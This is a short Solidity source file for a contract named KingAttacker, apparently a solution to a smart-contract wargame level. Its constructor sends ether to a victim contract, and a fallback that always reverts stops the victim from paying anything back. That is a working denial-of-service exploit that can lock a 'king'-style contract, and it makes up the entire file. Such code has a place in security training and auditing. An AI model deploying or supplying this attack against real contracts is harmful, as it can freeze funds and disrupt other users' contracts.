// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract KingAttacker {
    constructor(address victim) payable {
        victim.call{value: msg.value}("");
    }

    error DosError();

    fallback() external payable {
        revert DosError();
    }
}
